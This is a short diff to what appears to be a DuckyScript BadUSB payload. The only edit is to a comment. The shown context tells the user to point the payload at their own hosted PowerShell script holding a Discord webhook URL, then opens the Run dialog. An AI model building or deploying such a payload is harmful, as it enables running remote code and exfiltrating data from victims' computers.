@@ -1,4 +1,4 @@
-#Here is the payload in DuckyScript format:
+#Here is the payload in DuckyScript format:#
 
 REM make sure to replace: `https://raw.githubusercontent.com/..LINK_TO../main/YourHostedFile.ps1` with your own url, with the modified discord webhook url in it too.
 GUI r
